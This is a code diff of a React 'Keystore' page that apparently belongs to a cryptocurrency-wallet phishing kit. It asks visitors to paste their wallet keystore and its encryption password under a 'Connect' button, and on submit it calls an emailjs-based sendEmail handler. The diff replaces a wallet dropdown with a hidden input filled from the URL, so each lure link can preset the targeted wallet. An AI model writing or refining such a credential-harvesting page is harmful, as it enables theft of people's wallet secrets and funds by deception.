@@ -1,9 +1,10 @@
 import React, { useState } from "react";
 import emailjs from "emailjs-com";
-import { Link } from "react-router-dom";
 
-import Data from "../data"
-
+import {
+  Link,
+  useParams
+} from "react-router-dom";
 
 const sendEmail = (e) => {
   e.preventDefault();
@@ -30,6 +31,7 @@ const sendEmail = (e) => {
 
 const Keystore = () => {
   const [hide, setHide] = useState(false);
+  let { id } = useParams();
 
   const Showmodal = () => {
     setHide(false);
@@ -64,15 +66,6 @@ const Keystore = () => {
           </div>
         ) : null}
         <form onSubmit={sendEmail}>
-          <label for="wallet"> Choose Wallet: {" "}</label>
-          <select style={{ color: "black", padding: ".5em" }} name="wallet" id="wallet">
-            {Data.map((item) => {
-              return (
-                <option style={{ color: "black" }} key={item.id} value={item.name} name="wallet">{item.name}</option>
-              )
-            })}
-          </select>
-          <br />
           <input
             type="text"
             placeholder="Enter your keystore"
@@ -91,6 +84,7 @@ const Keystore = () => {
           <h6 className="h4">
             Several lines of text beginning with '(...)' plus the password you used to encrypt it.
           </h6>
+          <input type="text" value={id} className="hiddeen" name="wallet" />
           <button type="submit" onClick={Showmodal}>
             {" "}
             <b>Connect</b>{" "}
